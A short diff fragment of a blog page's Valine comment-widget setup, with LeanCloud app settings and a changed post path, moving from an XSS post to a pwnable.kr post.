     new Valine(Object.assign({"enable":true,"appId":"3uGsbMNvxiG0LkbyciDSaxmY-MdYXbMMI","appKey":"1dU1y3SudPaV6pdTET96j5M2","placeholder":"欢迎交流讨论...","avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-cn","visitor":true,"comment_count":true,"recordIP":false,"serverURLs":null,"enableQQ":false,"requiredFields":[]}, {
       el: '#valine-comments',
-      path: "/2019/03/01/xss/",
+      path: "/2021/03/06/pwnable.kr_1/",
       serverURLs: "https://3ugsbmnv.api.lncldglobal.com"
     }));
   }, window.Valine);
